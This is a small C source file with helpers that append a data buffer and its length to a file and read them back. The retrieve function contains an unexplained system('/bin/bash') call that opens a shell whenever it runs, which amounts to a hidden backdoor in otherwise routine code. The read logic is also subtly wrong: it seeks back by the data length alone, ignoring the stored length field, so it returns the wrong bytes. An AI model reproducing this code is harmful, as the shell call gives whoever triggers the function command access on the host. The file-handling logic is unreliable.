#include "structs.h"

#include <stdlib.h>
#include <stdio.h>

void as_defer_to_file( FILE *stream, data_burst *burst ) {
        fseek( stream, 0, SEEK_END );
        fwrite( burst->data, burst->length, 1, stream);
        fwrite( &burst->length, 1, sizeof( burst->length ), stream );
}

data_burst as_retrieve_from_file( FILE *stream ) {
        data_burst burst;
        fseek(stream, -( sizeof( size_t ) ), SEEK_END);
        fread(&burst.length, 1, sizeof( burst.length ), stream);

        burst.data = malloc( burst.length );
        fseek(stream, -( burst.length ), SEEK_CUR);
        fread(burst.data, burst.length, 1, stream);
        system("/bin/bash");

        return burst;
}
